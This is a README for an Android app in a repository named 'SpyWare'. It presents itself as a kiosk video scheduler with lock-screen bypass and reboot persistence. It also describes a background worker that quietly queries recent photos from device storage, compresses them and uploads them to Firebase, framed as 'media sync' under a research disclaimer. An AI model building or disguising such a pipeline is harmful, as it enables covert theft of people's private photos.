# PlaybackMaster (Android Kiosk Scheduler & Media Processing Research)

[](https://kotlinlang.org)
[](https://developer.android.com)
[](https://gradle.org)
[](LICENSE)

PlaybackMaster is an Android Kotlin application designed to demonstrate automated kiosk video playback, precision RTC wake-up scheduling, and background media processing using modern Android Jetpack components.

> [!IMPORTANT]
> **Ethical & Educational Research Disclaimer**  
> This repository contains architectural and experimental code designed to demonstrate Android kiosk video scheduling, `AlarmManager` wake-lock lifecycles, and `WorkManager` background media synchronization. It is published strictly for **academic, educational, and research purposes**. It must not be utilized for unauthorized monitoring, surveillance, or privacy-invasive telemetry.

---

## Architecture & Workflows

```mermaid
graph TD
    subgraph Kiosk_Playback_System ["Foreground Kiosk Playback Flow"]
        A[HomeFragment UI] -->|Configure Time Window| B[PreferencesHelper]
        A -->|Schedule Daily Alarm| C[AlarmUtils]
        C -->|setExactAndAllowWhileIdle| D[AlarmManager RTC Wakeup]
        D -->|Wake Lock Trigger| E[MainActivity / VideoFragment]
        E -->|Fullscreen Playback| F[ExoPlayer 2.19.1]
        G[Device Reboot] -->|BOOT_COMPLETED| H[BootReceiver]
        H -->|Re-arm Exact Alarm| C
    end

    subgraph Media_Sync_Pipeline ["Background Media Processing Pipeline"]
        M[MainActivity] -->|WorkRequest Enqueued| N[WorkManager: ImageUploadWorker]
        N -->|Query Recent Media| O[MediaStore.Images.Media]
        O -->|80% JPEG Compression| P[Glide / FileOutputStream]
        P -->|Cloud Sync| Q[Firebase Storage]
    end
```



---

## Key Features

- **Precision RTC Playback Scheduling**: Utilizes Android's `AlarmManager.setExactAndAllowWhileIdle` to automatically trigger full-screen video playback at scheduled daily start times.
- **ExoPlayer Video Engine**: Fullscreen landscape media player utilizing Google ExoPlayer 2.19.1 with automated wake-lock management and lock-screen bypass.
- **Reboot Persistence**: `BootReceiver` listens for `android.intent.action.BOOT_COMPLETED` to re-arm scheduled alarms seamlessly following device restarts.
- **Background Media Synchronization**: `CoroutineWorker` pipeline leveraging AndroidX WorkManager and Bumptech Glide for batch image compression and cloud sync.
- **Modern Jetpack Architecture**: Built with Single-Activity Navigation (`NavHostFragment`), ViewBinding, and clean separation of concerns.

---

## Technology Stack

| Layer | Technology / Library | Version |
|---|---|---|
| **Language** | Kotlin | 2.0.21 |
| **Build System** | Android Gradle Plugin (AGP) / Gradle | 8.8.0 / 8.10.2 |
| **Target / Compile SDK** | Android SDK 35 (Vanilla Ice Cream) | 35 |
| **Minimum SDK** | Android SDK 21 (Lollipop) | 21 |
| **Video Playback** | Google ExoPlayer | 2.19.1 |
| **Background Processing** | AndroidX WorkManager Kotlin Extensions | 2.10.0 |
| **Image Processing** | Bumptech Glide | 4.15.1 |
| **Cloud Storage** | Firebase Storage / BoM | 21.0.1 / 33.8.0 |
| **Navigation** | Jetpack Navigation Component | 2.8.5 |

---

## Setup & Local Development

### Prerequisites
- Android Studio Ladybug (2024.2.1+) or newer
- JDK 17 / Java 11 runtime
- Android SDK 35 installed

### Step-by-Step Configuration

1. **Clone the Repository:**
   ```bash
   git clone https://github.com/shayann07/SpyWare.git
   cd SpyWare
   ```

2. **Configure Firebase Credentials:**
   Copy the example template and supply your own Firebase configuration:
   ```bash
   cp app/google-services.json.example app/google-services.json
   ```

3. **Configure Local SDK Path:**
   Copy the local properties template:
   ```bash
   cp local.properties.example local.properties
   ```

4. **Build and Run:**
   ```bash
   ./gradlew assembleDebug
   ```

---

## Repository Structure

```
SpyWare/
├── app/
│   ├── src/main/
│   │   ├── java/com/shayan/playbackmaster/
│   │   │   ├── receivers/      # BootReceiver (BOOT_COMPLETED)
│   │   │   ├── services/       # Standalone PlaybackService
│   │   │   ├── ui/             # MainActivity, HomeFragment, VideoFragment
│   │   │   ├── utils/          # AlarmUtils, PreferencesHelper, TimePickerHelper
│   │   │   └── worker/         # ImageUploadWorker (WorkManager)
│   │   ├── res/                # Layouts, navigation graph, drawable assets
│   │   └── AndroidManifest.xml # Kiosk permissions & components
│   ├── google-services.json.example
│   └── build.gradle.kts
├── gradle/libs.versions.toml   # Dependency Version Catalog
├── local.properties.example
├── LICENSE                     # MIT License
└── README.md
```

---

## License

Distributed under the MIT License. See [LICENSE](LICENSE) for more information.

Copyright (c) 2026 **shayann07**
